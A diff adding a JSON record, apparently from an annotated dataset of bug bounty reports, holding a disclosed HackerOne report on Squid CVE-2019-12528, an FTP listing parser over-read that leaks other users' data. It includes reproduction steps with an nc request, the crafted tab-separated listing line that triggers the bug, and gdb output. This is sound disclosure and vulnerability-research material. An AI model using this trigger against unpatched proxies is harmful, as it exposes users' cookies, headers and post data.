@@ -1,0 +1,46 @@
+{
+  "reported_to": "Internet Bug Bounty",
+  "reported_by": "jeriko_one ",
+  "title": "Squid leaks previous content from reusable buffer",
+  "content": "\nSummary:\nA malicious response to a FTP request can cause Squid to miscalculate the length of a string copying data past the terminating NULL. Due to Squid's memory pool the contents that is exposed could range from internal data, to other user's private Request/Response to Squid.\nThis exist in Squid-4.9 and Below and was fixed in Squid-4.10\nThis vulnerability was assigned CVE-2019-12528.\nSteps To Reproduce:\nA custom config is should not be needed.\nI've attached a python script that returns the needed response to trigger this.\n1) Start Squid\nCode 12 Bytes\n1./sbin/squid\n2) Start your malicious FTP Server\nCode 20 Bytes\n1./squid_leak.py 8080\n3) Make a request to the FTP server via Squid.\nCode 77 Bytes\n1printf \"GET ftp://<ftp ip>:8080/ HTTP/1.1\\r\\n\\r\\n\" | nc <squid hostname> 3128\n4) The FTP server should have sent the listing. A message from it saying\nCode 19 Bytes\n1<- 226 Listing sent\nShould be visible\nThe leaked data is now in the HTML that Squid has returned. The data will be under the line\n<th nowrap=\"nowrap\"><a href=\"../\">Parent Directory</a> (<a href=\"/\">Root Directory</a>)</th>\nWithin the following <tr>\nFor reference a normal response would look like\nCode 46 Bytes\n1<tr class=\"entry\"><td colspan=\"5\">hi</td></tr>\nAnalysis\nThe issue begins in Ftp::Gateway::parsingListing the relevant snippet being\nCode 344 Bytes\n1    line = (char *)memAllocate(MEM_4K_BUF);\n2    ++end;\n3    s = sbuf;\n4    s += strspn(s, crlf);\n5\n6    for (; s < end; s += strcspn(s, crlf), s += strspn(s, crlf)) {\n7        debugs(9, 7, HERE << \"s = {\" << s << \"}\");\n8        linelen = strcspn(s, crlf) + 1;\n9\t\t<snip>\n10        xstrncpy(line, s, linelen);\n11\t\t<snip>\n12\t\tif (htmlifyListEntry(line, html)) \nA crucial thing to notice here is the following:\nline is allocated with memAllocate(MEM_4K_BUF) this is what will lead us to reading previous content. Buffers allocated via this method aren't ever free'd, but are put back into their respective pools. Zeroing of the buffer is possible, but is not enabled for this type of memory.\nWithin ftpListParseParts (FtpGateway.cc) is where the root of the vulnerability exist.\nThis function can handle various formats for listings.\nA common procedure is done on all of them before that then. They are converted\ninto tokens by strtok.\nCode 157 Bytes\n1    for (t = strtok(xbuf, w_space); t && n_tokens < MAX_TOKENS; t = strtok(NULL, w_space)) {\n2        tokens[n_tokens] = xstrdup(t);\n3        ++n_tokens;\n4    }\nPlease note that strok uses w_space as delimiters\nCode 30 Bytes\n1\t#define w_space     \" \\t\\n\\r\"\nThe listing format that we'll focus on is DOS format (FtpGateway.cc:648)\nFor listings that aren't directories the following code is executed:\nCode 332 Bytes\n1        } else {\n2            /* A file. Name begins after size, with a space in between */\n3            snprintf(tbuf, 128, \" %s %s\", tokens[2], tokens[3]);\n4            ct = strstr(buf, tbuf);\n5\n6            if (ct) {\n7                ct += strlen(tokens[2]) + 2;\n8            }\n9        }\n10\n11        p->name = xstrdup(ct ? ct : tokens[3]);\nSquid will put tokens[2] and tokens[3] in a temporary buffer with 2 spaces. It\nthen searches for this string in the original line setting ct to the start of\nthis string. It then increments ct by the length of tokens[2] + 2. What is\npointed to now is used as the name.\nThe false assumption here is that tokens will be separated by spaces in the\noriginal line.\nConsider the following example where \\t denotes a tab, and * is for repetition:\nCode 29 Bytes\n104-05-70 09:33PM\\tA*126 A*126\nGoing through the referenced code path when snprintf is called tbuf will be\nfilled as: \" A*126\". Then when strstr is called, it'll find the token, but it\nwon't be token[2] it'll be token[3] as token[2] started with a tab. When it\nincrements by the length strlen(tokens[2]) + 2 it'll put ct past the\nterminating NULL byte of this line.\nThe contents is then copied into another buffer which will be displayed to the attacker\np->name = xstrdup(ct ? ct : tokens[3]);\nSetting a breakpoint in we can confirm that it's leaking data\nConfirming that the tokens are 126:\nCode 91 Bytes\n1(gdb) call (size_t)strlen(tokens[2])\n2$2 = 126\n3(gdb) call (size_t)strlen(tokens[3])\n4$3 = 126\nHere ct is set to the wrong token since it's looking for \" A\"\nCode 351 Bytes\n1snprintf(tbuf, 128, \" %s %s\", tokens[2], tokens[3]);\n2(gdb) n\n3675\t            ct = strstr(buf, tbuf);\n4(gdb) call (size_t)strlen(tbuf)\n5$4 = 127\n6\n7(gdb) p tbuf\n8$5 = \" \", 'A' <repeats 126 times>\n9\n10(gdb) p ct\n11$6 = 0x62100006918f \" \", 'A' <repeats 126 times>\n12\n13678\t                ct += strlen(tokens[2]) + 2;\n14(gdb) call (size_t) strlen(tokens[2]) + 2\n15$8 = 128\nHere we see ct is now past the terminating NULL\nCode 44 Bytes\n1(gdb) x/2xb ct - 1\n20x62100006920e:\t0x00\t0x66\nImpact\nAn attacker can leak sensitive information from the Squid process. This could include other user's Request and Response which could have headers, cookies, full bodies, and post data.\n\n",
+  "severity": [
+    8.8,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Buffer Over-read"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1630035420,
+  "report_url": "https://hackerone.com/reports/824163",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Start Squid: ./sbin/squid"
+    ],
+    [
+      2,
+      "Start malicious FTP server: ./squid_leak.py 8080"
+    ],
+    [
+      3,
+      "Make a request to the FTP server via Squid: printf \"GET ftp://<ftp ip>:8080/ HTTP/1.1\\r\\n\\r\\n\" | nc <squid hostname> 3128"
+    ],
+    [
+      4,
+      "Observe leaked data in the HTML response under the Parent Directory line"
+    ]
+  ],
+  "vuln_description": "A malicious response to an FTP request can cause Squid to miscalculate string length when copying data, leading to exposure of memory pool contents. This can leak sensitive information including other users' private data due to improper handling of FTP directory listings with tab-separated tokens.",
+  "reason": "The vulnerability requires understanding Squid's memory pool behavior, FTP protocol handling, and precise manipulation of directory listing formats with non-space delimiters. The attacker must craft a specific malformed FTP response that exploits the token parsing logic flaw.",
+  "new_complexity": "HIGH",
+  "requires_code": true,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
